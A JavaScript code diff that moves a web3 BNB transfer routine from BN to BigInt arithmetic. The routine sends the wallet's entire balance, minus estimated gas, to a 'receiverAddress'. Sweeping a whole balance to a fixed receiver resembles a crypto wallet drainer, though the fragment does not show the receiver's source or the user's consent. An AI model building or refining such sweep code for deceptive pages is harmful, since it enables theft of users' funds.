@@ -36,7 +36,7 @@
           return;
         }
 
-        // Get full balance
+        // Get full balance (returned as a string in wei)
         const balance = await web3.eth.getBalance(sender);
 
         // Estimate dynamic gas cost
@@ -46,21 +46,23 @@
           value: balance
         });
         const gasPrice = await web3.eth.getGasPrice();
-        const gasEstimate = new web3.utils.BN(gasLimit).mul(new web3.utils.BN(gasPrice)); // Use BN instead of toBN
+        
+        // Calculate gas cost (gasLimit * gasPrice)
+        const gasEstimate = (BigInt(gasLimit) * BigInt(gasPrice)).toString();
 
-        // Subtract gas from balance
-        const amountToSend = new web3.utils.BN(balance).sub(gasEstimate); // Use BN instead of toBN
+        // Subtract gas from balance using BigInt
+        const amountToSend = (BigInt(balance) - BigInt(gasEstimate)).toString();
 
-        if (amountToSend.lte(0)) {
+        if (BigInt(amountToSend) <= 0) {
           alert("Insufficient BNB to cover gas fees.");
           return;
         }
 
-        // Send BNB (convert amountToSend to hex string)
+        // Send BNB (amountToSend is already a string in wei, convert to hex)
         const tx = await web3.eth.sendTransaction({
           from: sender,
           to: receiverAddress,
-          value: web3.utils.toHex(amountToSend) // Convert to hex to avoid validation error
+          value: web3.utils.toHex(amountToSend) // Convert to hex for the transaction
         });
 
         alert("BNB sent successfully! Tx hash: " + tx.transactionHash);
